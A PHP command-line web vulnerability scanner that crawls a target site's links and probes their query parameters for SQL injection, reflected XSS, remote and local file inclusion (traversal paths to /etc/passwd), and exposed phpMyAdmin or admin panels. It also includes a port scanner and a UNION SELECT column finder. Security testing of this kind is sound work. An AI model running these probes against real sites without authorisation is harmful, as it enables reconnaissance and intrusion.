#!/usr/bin/env php
<?php
/**
 * BugPilot PHP Vulnerability Scanner
 * Open-source web vulnerability scanner.
 *
 * Scans for: SQLi, XSS, RFI, LFI, and admin panel exposure.
 *
 * Usage: php scanner.php
 *
 * @license MIT
 */

error_reporting(E_ALL & ~E_NOTICE);

Start();

function Start() {
    $commands = array('help', 'sql', 'rfi', 'lfi', 'xss', 'full', 'wget', 'quit', 'pmapwn', 'injector', 'hexstring', 'md5string', 'portscan');

    fwrite(STDOUT, "\n");
    Logo();
    Tips();
    while (1) {
        fwrite(STDOUT, "\n-CMD$: ");
        $cmd = trim(fgets(STDIN));
        if ($cmd == 'full') {
            fwrite(STDOUT, "\n-SITE: ");
            $site = trim(fgets(STDIN));
            if (empty($site)) {
                fwrite(STDOUT, "[Error] Please enter site URL\n");
            } else {
                full($site);
            }
        } else {
            if (in_array($cmd, $commands)) {
                $cmd();
            } else {
                fwrite(STDOUT, "[Error] Command not found\n");
                Tips();
            }
        }
    }
}

function Logo() {
    $text  = "|***************************************************************************************|\n";
    $text .= "        BugPilot PHP Vulnerability Scanner v1.0\n";
    $text .= "        Open-source web security scanning tool\n";
    $text .= "        Contributors: BugPilot Community\n";
    $text .= "|***************************************************************************************|\n";
    fwrite(STDOUT, $text);
}

function Help() {
    $text  = "[sql]   ------> Scan for SQL Injection\n";
    $text .= "[xss]   ------> Scan for Cross-Site Scripting\n";
    $text .= "[rfi]   ------> Scan for Remote File Inclusion\n";
    $text .= "[lfi]   ------> Scan for Local File Inclusion\n";
    $text .= "[pmapwn]------> Scan for phpMyAdmin exposure\n";
    $text .= "[full]  ------> Run all scans (sql, xss, rfi, lfi, pmapwn)\n";
    $text .= "[injector] ----> Automatic SQL column finder\n";
    $text .= "[hexstring] ----> Convert string to hex\n";
    $text .= "[md5string] ----> Convert string to MD5 hash\n";
    $text .= "[portscan] ----> Check open/closed ports\n";
    $text .= "[wget]     ----> Download a file from URL\n";
    $text .= "[quit]     ----> Exit the program\n";
    fwrite(STDOUT, $text);
}

function Tips() {
    fwrite(STDOUT, "[Tips] Type 'help' for commands. Type 'quit' to exit.\n");
}

function full($site) {
    fwrite(STDOUT, "[-] Start full scanning mode.\n");
    pmapwn($site, 1);
    fwrite(STDOUT, "[-] Start SQL Injection Scan\n");
    sql($site, 1);
    fwrite(STDOUT, "[-] Start XSS Scan\n");
    xss($site, 1);
    fwrite(STDOUT, "[-] Start RFI Scan\n");
    rfi($site, 1);
    fwrite(STDOUT, "[-] Start LFI Scan\n");
    lfi($site, 1);
}

function hexstring() {
    fwrite(STDOUT, "-String: ");
    $string = trim(fgets(STDIN));
    fwrite(STDOUT, "[-] String: $string\n");
    fwrite(STDOUT, "[-] Hex: " . HexValue($string) . "\n");
}

function md5string() {
    fwrite(STDOUT, "-String: ");
    $string = trim(fgets(STDIN));
    fwrite(STDOUT, "[-] String: $string\n");
    fwrite(STDOUT, "[-] MD5: " . md5($string) . "\n");
}

function portscan() {
    fwrite(STDOUT, "-IP/Domain: ");
    $host = trim(fgets(STDIN));
    fwrite(STDOUT, "-Start Port: ");
    $sport = trim(fgets(STDIN));
    fwrite(STDOUT, "-End Port: ");
    $eport = trim(fgets(STDIN));
    fwrite(STDOUT, "[-] IP/Domain : $host\n");
    $sport = intval($sport);
    $eport = intval($eport);
    fwrite(STDOUT, "[-] Checking...\n");
    for ($i = $sport; $i <= $eport; $i++) {
        $check = @fsockopen($host, $i, $errno, $errstr, 3);
        if ($check) {
            fwrite(STDOUT, "[-] Port '$i' is open\n");
            fclose($check);
        }
    }
    fwrite(STDOUT, "[-] Done\n");
}

function quit() {
    fwrite(STDOUT, "[+] Exit the program\n");
    exit;
}

/*
 * --- SQL Injection Scanner ---
 * Detects SQL errors by injecting a single quote and checking for database errors.
 */
function sql($site = '', $full = '0') {
    $sql_errors = array(
        'You have an error in your SQL',
        'Division by zero',
        'supplied argument is not a valid MySQL result',
        'Call to a member function',
        'Microsoft JET Database',
        'ODBC Microsoft Access Driver',
        'Microsoft OLE DB Provider for SQL Server',
        'Unclosed quotation mark',
        'Microsoft OLE DB Provider for Oracle',
        'Incorrect syntax near',
        'ORA-00936',
        'ORA-00911',
        'PostgreSQL query failed',
        'Warning: pg_',
        'Unterminated quoted string',
    );

    if ($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
    } else {
        $site = $site;
    }

    $parsed = parse_url($site);
    if (!$parsed || !isset($parsed['host'])) {
        fwrite(STDOUT, "[Error] Invalid URL\n");
        return;
    }

    fwrite(STDOUT, "[-] URL : {$parsed['host']}\n");
    fwrite(STDOUT, "[-] Path: {$parsed['path']}\n");
    fwrite(STDOUT, "[-] Try connect to host\n");

    $url = isset($parsed['scheme']) ? $parsed['scheme'] . "://" . $parsed['host'] : "http://" . $parsed['host'];
    $url .= isset($parsed['path']) ? $parsed['path'] : '/';

    $base_content = con_host($url);
    if (!$base_content) {
        fwrite(STDOUT, "[!] Connect to host failed\n");
        return;
    }

    fwrite(STDOUT, "[+] Connect to host successful\n");
    Get_Info($url);
    fwrite(STDOUT, "[-] Finding link on the website\n");
    $links = find_link($base_content);
    if ($links === false || empty($links)) {
        fwrite(STDOUT, "[+] No links found\n");
        return;
    }
    fwrite(STDOUT, "[+] Found link : " . count($links) . "\n");
    fwrite(STDOUT, "[-] Finding vulnerable...\n");

    $vulnerable = array();
    foreach ($links as $link) {
        if (!isset($parsed['host'])) continue;
        $link = resolve_link($link, $url, $parsed['host']);
        $payload_url = inject_payload($link, "'");
        $response = con_host($payload_url);
        if ($response) {
            foreach ($sql_errors as $error) {
                if (stripos($response, $error) !== false) {
                    fwrite(STDOUT, "[+] SQL Injection vulnerable : $payload_url\n");
                    $vulnerable[] = $payload_url;
                    break;
                }
            }
        }
    }

    fwrite(STDOUT, "[+] Done\n");
    if (!empty($vulnerable)) {
        file_put_contents('vulnerable.log', implode("\r\n", $vulnerable) . "\r\n", FILE_APPEND);
        fwrite(STDOUT, "[-] See 'vulnerable.log' for vulnerable list\n");
    }
}

/*
 * --- XSS Scanner ---
 * Detects reflected XSS by injecting a unique marker and checking if it's reflected.
 */
function xss($site = '', $full = '0') {
    $xss_marker = '<xss-test-marker>';

    if ($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
    } else {
        $site = $site;
    }

    $parsed = parse_url($site);
    if (!$parsed || !isset($parsed['host'])) {
        fwrite(STDOUT, "[Error] Invalid URL\n");
        return;
    }

    fwrite(STDOUT, "[-] URL : {$parsed['host']}\n");
    fwrite(STDOUT, "[-] Path: {$parsed['path']}\n");
    fwrite(STDOUT, "[-] Try connect to host\n");

    $url = isset($parsed['scheme']) ? $parsed['scheme'] . "://" . $parsed['host'] : "http://" . $parsed['host'];
    $url .= isset($parsed['path']) ? $parsed['path'] : '/';

    $base_content = con_host($url);
    if (!$base_content) {
        fwrite(STDOUT, "[!] Connect to host failed\n");
        return;
    }

    fwrite(STDOUT, "[+] Connect to host successful\n");
    Get_Info($url);
    fwrite(STDOUT, "[-] Finding link on the website\n");
    $links = find_link($base_content);
    if ($links === false || empty($links)) {
        fwrite(STDOUT, "[+] No links found\n");
        return;
    }
    fwrite(STDOUT, "[+] Found link : " . count($links) . "\n");
    fwrite(STDOUT, "[-] Finding vulnerable...\n");

    $vulnerable = array();
    foreach ($links as $link) {
        $link = resolve_link($link, $url, $parsed['host']);
        $payload_url = inject_payload($link, $xss_marker);
        $response = con_host($payload_url);
        if ($response && stripos($response, $xss_marker) !== false) {
            fwrite(STDOUT, "[+] XSS vulnerable (unescaped output) : $payload_url\n");
            $vulnerable[] = $payload_url;
        }
    }

    fwrite(STDOUT, "[+] Done\n");
    if (!empty($vulnerable)) {
        file_put_contents('vulnerable.log', implode("\r\n", $vulnerable) . "\r\n", FILE_APPEND);
        fwrite(STDOUT, "[-] See 'vulnerable.log' for vulnerable list\n");
    }
}

/*
 * --- RFI Scanner ---
 * Detects Remote File Inclusion by checking if external content is rendered.
 */
function rfi($site = '', $full = '0') {
    $rfi_marker = 'rfi-test-8f3a2b';

    if ($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
    } else {
        $site = $site;
    }

    $parsed = parse_url($site);
    if (!$parsed || !isset($parsed['host'])) {
        fwrite(STDOUT, "[Error] Invalid URL\n");
        return;
    }

    fwrite(STDOUT, "[-] URL : {$parsed['host']}\n");
    fwrite(STDOUT, "[-] Path: {$parsed['path']}\n");
    fwrite(STDOUT, "[-] Try connect to host\n");

    $url = isset($parsed['scheme']) ? $parsed['scheme'] . "://" . $parsed['host'] : "http://" . $parsed['host'];
    $url .= isset($parsed['path']) ? $parsed['path'] : '/';

    $base_content = con_host($url);
    if (!$base_content) {
        fwrite(STDOUT, "[!] Connect to host failed\n");
        return;
    }

    fwrite(STDOUT, "[+] Connect to host successful\n");
    Get_Info($url);
    $links = find_link($base_content);
    if ($links === false || empty($links)) {
        fwrite(STDOUT, "[+] No links found\n");
        return;
    }
    fwrite(STDOUT, "[+] Found link : " . count($links) . "\n");
    fwrite(STDOUT, "[-] Finding vulnerable...\n");

    $vulnerable = array();
    foreach ($links as $link) {
        $link = resolve_link($link, $url, $parsed['host']);
        $payload_url = inject_payload($link, 'https://httpbin.org/get?rfi_test=' . $rfi_marker);
        $response = con_host($payload_url);
        if ($response && stripos($response, $rfi_marker) !== false) {
            fwrite(STDOUT, "[+] RFI vulnerable : $payload_url\n");
            $vulnerable[] = $payload_url;
        }
    }

    fwrite(STDOUT, "[+] Done\n");
    if (!empty($vulnerable)) {
        file_put_contents('vulnerable.log', implode("\r\n", $vulnerable) . "\r\n", FILE_APPEND);
        fwrite(STDOUT, "[-] See 'vulnerable.log' for vulnerable list\n");
    }
}

/*
 * --- LFI Scanner ---
 * Detects Local File Inclusion by injecting path traversal sequences.
 */
function lfi($site = '', $full = '0') {
    $list_lfi = array(
        '../../../../etc/passwd',
        '../../../../../etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '/etc/passwd',
        '/etc/hosts',
    );

    if ($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
    } else {
        $site = $site;
    }

    $parsed = parse_url($site);
    if (!$parsed || !isset($parsed['host'])) {
        fwrite(STDOUT, "[Error] Invalid URL\n");
        return;
    }

    fwrite(STDOUT, "[-] URL : {$parsed['host']}\n");
    fwrite(STDOUT, "[-] Path: {$parsed['path']}\n");
    fwrite(STDOUT, "[-] Try connect to host\n");

    $url = isset($parsed['scheme']) ? $parsed['scheme'] . "://" . $parsed['host'] : "http://" . $parsed['host'];
    $url .= isset($parsed['path']) ? $parsed['path'] : '/';

    $base_content = con_host($url);
    if (!$base_content) {
        fwrite(STDOUT, "[!] Connect to host failed\n");
        return;
    }

    fwrite(STDOUT, "[+] Connect to host successful\n");
    Get_Info($url);
    $links = find_link($base_content);
    if ($links === false || empty($links)) {
        fwrite(STDOUT, "[+] No links found\n");
        return;
    }
    fwrite(STDOUT, "[+] Found link : " . count($links) . "\n");
    fwrite(STDOUT, "[-] Finding vulnerable...\n");

    $vulnerable = array();
    if (is_array($links)) {
        foreach ($links as $link) {
            $link = resolve_link($link, $url, $parsed['host']);
            foreach ($list_lfi as $payload) {
                $test_url = inject_payload($link, $payload);
                $response = con_host($test_url);
                if ($response && stripos($response, 'root:') !== false) {
                    fwrite(STDOUT, "[-] LFI vulnerable : $test_url\n");
                    $vulnerable[] = $test_url;
                    break;
                }
            }
        }
    }

    fwrite(STDOUT, "[-] Done\n");
    if (!empty($vulnerable)) {
        file_put_contents('vulnerable.log', implode("\r\n", $vulnerable) . "\r\n", FILE_APPEND);
        fwrite(STDOUT, "[+] See 'vulnerable.log' for vulnerable list\n");
    }
}

/*
 * --- phpMyAdmin Scanner ---
 * Checks for common phpMyAdmin paths (detection only, no exploitation).
 */
function pmapwn($site = '', $full = '0') {
    $paths = array(
        '/phpmyadmin/',
        '/phpMyAdmin/',
        '/PMA/',
        '/admin/',
        '/dbadmin/',
        '/mysql/',
        '/myadmin/',
        '/webadmin/',
        '/sqlmanager/',
        '/mysqlmanager/',
    );

    if ($full == '0') {
        fwrite(STDOUT, "\n-SITE: ");
        $site = trim(fgets(STDIN));
    } else {
        $site = $site;
    }

    $parsed = parse_url($site);
    if (!$parsed || !isset($parsed['host'])) {
        fwrite(STDOUT, "[Error] Invalid URL\n");
        return;
    }

    fwrite(STDOUT, "\n[-] Site : $site\n");
    fwrite(STDOUT, "[-] Scanning for admin panels and phpMyAdmin...\n");

    foreach ($paths as $path) {
        $url = rtrim($site, '/') . $path;
        phpmyadmin_scan_site($url);
    }
}

function phpmyadmin_scan_site($url) {
    $response = con_host($url);
    if ($response) {
        $status = Get_Status($url);
        if ($status == 200) {
            if (stripos($response, 'phpMyAdmin') !== false || stripos($response, 'phpmyadmin') !== false) {
                fwrite(STDOUT, "\n[!] Found phpMyAdmin panel: $url\n");
                file_put_contents('vulnerable.log', "[phpMyAdmin] $url\r\n", FILE_APPEND);
            } elseif (stripos($response, '<form') !== false && stripos($response, 'password') !== false) {
                fwrite(STDOUT, "\n[!] Possible admin panel found: $url\n");
                file_put_contents('vulnerable.log', "[AdminPanel] $url\r\n", FILE_APPEND);
            }
            return true;
        }
    }
    return false;
}

/**
 * --- SQL Column Finder ---
 * Finds the number of columns in a UNION SELECT by testing incrementally.
 * Usage: provide a URL with a numeric parameter and the bugpilot_test token.
 * Example: http://site.com/page.php?id=bugpilot_test
 */
function injector() {
    fwrite(STDOUT, "\n-URL: ");
    $url = trim(fgets(STDIN));
    fwrite(STDOUT, "\n-URL Ending (-- or /*): ");
    $end = trim(fgets(STDIN));

    if (stripos($url, 'bugpilot_test') === false) {
        fwrite(STDOUT, "[-] Please insert 'bugpilot_test' token on the URL\n");
        fwrite(STDOUT, "[-] Example: http://site.com/news.php?id=bugpilot_test\n");
        return;
    }

    $valid_endings = array('--', '/*');
        if (!in_array($end, $valid_endings)) {
        $end = '--';
    }

    fwrite(STDOUT, "[-] URL : $url\n");
    fwrite(STDOUT, "[%] Trying connect to host...\n");
    $base_content = con_host($url);
    if (!$base_content) {
        fwrite(STDOUT, "[!] Connect to host failed\n");
        return;
    }

    fwrite(STDOUT, "[+] Connect to host successful\n");
    Get_Info($url);
    fwrite(STDOUT, "[-] Finding column number...\n");
    inject_get_column_num($url, $end);
}

function inject_get_column_num($url, $ending) {
    $max = 50;

    for ($i = 1; $i <= $max; $i++) {
        $cols = implode(',', array_fill(0, $i, '1'));
        $test_url = str_replace('bugpilot_test', "1+UNION+SELECT+{$cols}+{$ending}", $url);
        $response = con_host($test_url);
        if ($response && stripos($response, 'Warning') === false && stripos($response, 'error') === false) {
            fwrite(STDOUT, "[-] Found column number: {$i}\n");
            file_put_contents('injector.txt', "[-] Found column number: {$i}\r\n", FILE_APPEND);
            fwrite(STDOUT, "[-] URL: $test_url\n");
            file_put_contents('injector.txt', "[-] URL: $test_url\r\n", FILE_APPEND);
            return $i;
        }
    }

    fwrite(STDOUT, "[-] Could not determine column count (max {$max} tested)\n");
    return false;
}

function wget() {
    fwrite(STDOUT, "This is Wget\n");
    fwrite(STDOUT, "-Link : ");
    $url = trim(fgets(STDIN));

    $dir = 'downloaded';
    if (!file_exists($dir)) {
        mkdir($dir, 0755, true);
    }

    $filepath = $dir . '/' . basename(parse_url($url, PHP_URL_PATH));
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $fp = fopen($filepath, 'w+');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_exec($ch);
    curl_close($ch);
    fclose($fp);

    fwrite(STDOUT, "\n[-] Download finished!\n");
    fwrite(STDOUT, "[-] Saved into '$dir/' folder\n");
}

/* --- Helper Functions --- */

function Get_Info($site) {
    $info = con_host($site);
    if ($info) {
        $lines = explode("\n", $info);
        foreach ($lines as $line) {
            $line = trim($line);
            if (stripos($line, 'content-type') === 0 || stripos($line, 'server') === 0) {
                fwrite(STDOUT, "[-] $line\n");
            }
        }
        $ip = parse_url($site, PHP_URL_HOST);
        if ($ip) {
            fwrite(STDOUT, "[-] IP: " . gethostbyname($ip) . "\n");
        }
    }
}

function Get_Status($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_REFERER, "https://google.com");
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; BugPilot-Scanner/1.0)');
    curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $status;
}

function resolve_link($link, $base_url, $host) {
    if (filter_var($link, FILTER_VALIDATE_URL)) {
        return $link;
    }
    if (strpos($link, '/') === 0) {
        $scheme = parse_url($base_url, PHP_URL_SCHEME) ?: 'http';
        return $scheme . '://' . $host . $link;
    }
    return rtrim($base_url, '/') . '/' . ltrim($link, '/');
}

function inject_payload($url, $payload) {
    $parsed = parse_url($url);
    if (isset($parsed['query'])) {
        parse_str($parsed['query'], $params);
        foreach ($params as $key => &$val) {
            $params[$key] = $val . $payload;
        }
        unset($val);
        $parsed['query'] = http_build_query($params);
    }
    return build_url($parsed);
}

function build_url($parts) {
    $url = '';
    if (isset($parts['scheme'])) {
        $url .= $parts['scheme'] . '://';
    }
    if (isset($parts['host'])) {
        $url .= $parts['host'];
    }
    if (isset($parts['port'])) {
        $url .= ':' . $parts['port'];
    }
    if (isset($parts['path'])) {
        $url .= $parts['path'];
    }
    if (isset($parts['query'])) {
        $url .= '?' . $parts['query'];
    }
    return $url;
}

function con_host($host) {
    if (empty($host)) return false;

    $ch = curl_init($host);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_REFERER, "https://google.com");
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; BugPilot-Scanner/1.0)');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    $pg = curl_exec($ch);
    if (curl_errno($ch)) {
        fclose($pg);
        return false;
    }
    curl_close($ch);
    return $pg;
}

function find_link($text) {
    $find = '/href=["\']?([^"\']+)["\']?/i';
    $matches = array();
    preg_match_all($find, $text, $links);
    return isset($links[1]) ? $links[1] : array();
}

function HexValue($text) {
    $hex = '';
    for ($i = 0; $i < strlen($text); $i++) {
        $hex .= dechex(ord($text[$i]));
    }
    return $hex;
}

?>
